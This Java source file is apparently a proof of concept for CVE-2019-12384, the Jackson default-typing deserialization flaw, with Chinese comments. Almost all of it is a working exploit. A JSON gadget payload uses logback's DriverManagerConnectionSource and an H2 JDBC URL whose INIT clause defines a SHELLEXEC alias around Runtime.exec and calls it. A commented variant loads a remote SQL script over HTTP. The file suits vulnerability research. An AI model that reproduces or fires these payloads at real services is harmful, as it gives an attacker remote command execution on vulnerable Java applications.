package com.firebasky.cve;

import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class CVE_2019_12384 {
    //H2Rce
    public static void main(String[] args) throws IOException {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();//开启 defaultTyping
        String json = " [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');\"}]";
        Object o = objectMapper.readValue(json, Object.class);//反序列化对象
        String s = objectMapper.writeValueAsString(o);//

        //"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", "+"{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8999/inject.sql'\"}]";

    //    ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd)\\; }$$;"}]
    //同样使用文件存储模式，执行 CALL 命令调用函数 这样就省去了再去调用远程文件的问题
    //    ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');"}]

    }
}
